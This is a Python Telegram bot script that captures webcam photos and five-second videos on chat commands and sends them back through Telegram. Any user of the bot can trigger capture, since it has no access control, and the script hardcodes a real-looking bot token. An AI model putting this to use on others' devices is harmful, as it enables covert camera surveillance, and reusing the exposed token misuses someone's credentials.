from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import cv2
import logging
import os
import asyncio

# Replace 'YOUR_BOT_TOKEN' with your actual bot token.
bot_token = '7239458839:AAHTXtF23O2Zfe7q1OSOTtpQvbCjXCflFAg'

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Function to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Start command received")
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Bot started!")

# Function to capture an image
def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        logger.error("Cannot open camera")
        return None

    ret, frame = cap.read()
    if not ret:
        logger.error("Failed to capture image")
        cap.release()
        return None

    image_path = 'capture.jpg'
    cv2.imwrite(image_path, frame)
    cap.release()
    logger.info(f"Image captured and saved to {image_path}")
    return image_path

# Function to capture a 5-second video
def capture_video():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        logger.error("Cannot open camera")
        return None

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_path = 'capture.avi'
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))

    for _ in range(100):  # Capture for 5 seconds at 20 fps
        ret, frame = cap.read()
        if not ret:
            logger.error("Failed to capture video frame")
            cap.release()
            out.release()
            return None
        out.write(frame)

    cap.release()
    out.release()
    logger.info(f"Video captured and saved to {video_path}")
    return video_path

# Function to send a photo
async def send_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Photo command received")
    photo_path = capture_image()
    if photo_path is None or not os.path.exists(photo_path):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to capture photo")
        return

    try:
        with open(photo_path, 'rb') as photo_file:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=InputFile(photo_file))
        logger.info("Photo sent successfully")
    except Exception as e:
        logger.error(f"Failed to send photo: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send photo")

# Function to send a video
async def send_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Video command received")
    video_path = capture_video()
    if video_path is None or not os.path.exists(video_path):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to capture video")
        return

    try:
        with open(video_path, 'rb') as video_file:
            await context.bot.send_video(chat_id=update.effective_chat.id, video=InputFile(video_file))
        logger.info("Video sent successfully")
    except Exception as e:
        logger.error(f"Failed to send video: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send video")

# Function to stop the bot
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Stop command received")
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Bot stopping...")
    asyncio.get_event_loop().stop()

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(msg="Exception while handling an update:", exc_info=context.error)

# Set up the application
app = ApplicationBuilder().token(bot_token).build()

# Add command handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("photo", send_photo))
app.add_handler(CommandHandler("video", send_video))
app.add_handler(CommandHandler("stop", stop))
app.add_error_handler(error_handler)

# Start the application
app.run_polling()
